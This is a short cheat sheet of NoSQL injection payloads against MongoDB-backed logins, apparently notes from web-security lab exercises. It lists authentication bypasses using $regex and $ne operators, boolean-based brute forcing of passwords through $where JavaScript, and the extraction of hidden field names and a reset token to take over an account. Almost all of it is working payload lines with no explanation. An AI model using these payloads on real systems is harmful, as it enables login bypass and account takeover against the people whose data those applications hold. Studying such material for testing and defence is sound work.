'+' >> '||1||'
**Bypass Authen
```
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```
Bruteforce
```
' && '1'=='1 > true || ' && '1'=='2 >> error
```
```
administrator' && this.password.length < 30 || 'a'=='b
administrator' && this.password[§0§]=='§a§
```
forgetpassword+login
```
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"} > Invalid
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "1"} > Account locked
```
```
"$where":"Object.keys(this)[1].match('^.{$1$}$2$.*')"
$1$ > 0-20 || $2$ > bruteforce a-z,A-Z-0-9
find: username
"$where":"Object.keys(this)[2-4].match('^.{$1$}$2$.*')"
find: Tokenreset
GET /forgot-password?unlockToken=invalid > Invaild token
"$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"
GET /forgot-password?unlockToken=token
```

